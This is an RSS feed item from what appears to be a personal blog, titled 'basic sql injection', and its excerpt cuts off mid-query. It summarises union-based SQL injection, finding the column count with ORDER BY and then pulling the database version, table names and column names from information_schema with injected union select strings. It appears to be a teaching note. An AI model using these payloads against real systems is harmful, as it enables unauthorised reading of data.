channel.title: Sql on warrick.io
channel.description: Recent content in Sql on warrick.io

item.title: basic sql injection
item.description: SELECT user FROM users WHERE user.name = 'jeffrey'; FIND NUMBER OF COLUMNS “order by” trick - test if you can order by a column number NOW WE CAN DO A UNION (# OF COLUMNS MUST MATCH) ’ union select 1,2,3,version() – - NOW WE CAN GET TABLE, COLUMN, AND DATABASE INFO ’ union select 1,2,3,table_name from information_schema.tables where table_schema=“x8250” – - ’ union select 1,2,3,column_name from information_schema.columns where table…
